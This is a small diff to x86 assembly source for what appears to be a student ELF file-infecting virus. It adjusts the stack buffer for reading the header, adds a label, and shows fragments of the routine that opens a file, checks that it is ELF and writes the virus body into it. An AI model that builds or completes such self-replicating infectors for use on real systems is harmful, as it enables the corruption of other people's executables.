@@ -80,11 +80,12 @@ mov eax, [ebp-4]				; is neccessery?
 cmp eax, 0
 jl printErr						; ???
 
+
 ; load file header
-sub ebp, 80						; make room for header
+sub ebp, 84						; make room for header
 read eax, ebp, 80				; reads 80bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
 mov esi, ebp					; store header in esi
-add ebp, 80						; clean header from the stack
+add ebp, 84						; clean header from the stack
 
 ; check the file is ELF file
 mov dword ebx, esi
@@ -108,6 +109,7 @@ sub ecx, next_i-_start
 write eax, ecx, virus_end-_start
 
 ; close the file
+test:
 mov eax, [ebp-4]
 close eax
 
